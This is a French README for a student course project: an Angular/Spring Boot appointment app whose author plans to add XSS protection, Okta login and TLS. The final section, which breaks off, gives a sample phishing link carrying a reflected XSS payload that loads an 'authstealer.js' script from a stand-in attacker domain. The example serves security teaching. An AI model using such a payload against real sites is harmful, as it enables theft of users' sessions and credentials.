# UE_CyberApp_Ferretti

## Introduction

Ce document est un rendu/mode d'emploir pour le projet d'application web de l'UE CyberApp de l'IMT Atlantique. On commence par présenter la version coeur de notre application qui repose sur Angular 8 et Spring Boot puis on ajoute progressivement trois étapes de sécurisation avec tout d'abord la gestion des attaque xss côté springboot puis un ajout d'une mthode d'authentification avec okta et enfin la gestion des certificat pour établir une connexion sécurisée.

## L'application

Cette application a été développé en s'appuyant sur différent tutorials et cours sur Angular 8 et spring-Boot, l'objectif est de crée un système simple de gestion de rendez-vous pour une secrétaire. On limite notre application à un système de savegarde/édition/suppression des rendez-vous.

Les déscriptions ci-dessous repose sur la Version_1 de ce git.

### Le back-end avec Spring-Boot

#### Pour lancer l'application, on fait un run maven build sur eclipse et on choisi spring-boot:run

On commence par générer un spring-boot de base dans la version voulue ce qui nous donne un squelette d'application web sur lequelle on rajoute nos couche voulue.

Le Spring initializr permet de créer cette base :

![alt text](https://github.com/Sheecss/Ue_CyberApp_Ferretti/blob/main/img/spring%20initializr.PNG "Logo Title Text 1")

Les dépendences principales sont : 
 
![alt text](https://github.com/Sheecss/Ue_CyberApp_Ferretti/blob/main/img/Capture.PNG "Logo Title Text 1")

Une fois cette première étape effectuée, on rajoute notre couche personelle avec la classe Rdv que nous utiliserons. On peut aussi étendre ce système avec la création de classe Patient et Docteur mais pour montrer nos ajouts, cette base suffit :


![alt text](https://github.com/Sheecss/Ue_CyberApp_Ferretti/blob/main/img/classe_rdv.PNG "Logo Title Text 1")

Une fois nos items créés, on va ajoutés la possibilité de gérer une base de données avec un controller et un repository qui nous permettra de stocker nos rdv. Ce controller nous permet de mapper sur une url http://localhost:8080/rdv-liste qui contiendra une liste des rdvs que l'on récupérera sur notre interface angular.

![alt text](https://github.com/Sheecss/Ue_CyberApp_Ferretti/blob/main/img/rdvcontroller.PNG "Logo Title Text 1")

On aura sur l'url http://localhost:8080/rdvs, l'ensemble de nos rdvs en format json :

![alt text](https://github.com/Sheecss/Ue_CyberApp_Ferretti/blob/main/img/rdv_json.PNG "Logo Title Text 1")

### Le front-end avec Angular 8

#### Pour lancer l'application, on fait un run ng serve dans le répertoire Version_X/client

#### Pour notre partie Angular, en plus des composants habituel, on installe le package suivant : npm install --save ngx-mat-datetime-picker@2.0

On commence par créer le service rdv qui va gérer l'ajout et la récupération des rdvs, pour cela on utilise les mapping fait sous java ce qui donne :

![alt text](https://github.com/Sheecss/Ue_CyberApp_Ferretti/blob/main/img/rdv_service.PNG "Logo Title Text 1")

On met ensuite en place la partie affichage et selection de la liste des rdvs en utilisant des bouton cliquable qui renvoie ensuite vers al page d'édition de l'item voulue. On ajoute aussi un bouton Add :

# Mettre Image

Enfin, on crée le formulaire qui nous permet de modifier et ajouter des rdvs, on utilise ngModel pour remplir les cases avec les vgaleurs actuelles en cas de modification. On peut aussi Supprimer et retourner en arriere :

# Mettre Image

## Problème de vulnérabilité XSS côté SpringBoot :

Si on imagine un problème de pishing quelconque qui nous conduit à cliquer sur un lien frauduleux : [I'm an fraudulent link](http://localhost:8080/rdvs?q=puppies%3Cscript%20src=%22http://mallorysevilsite.com/authstealer.js%22%3E%3C/script%3E)

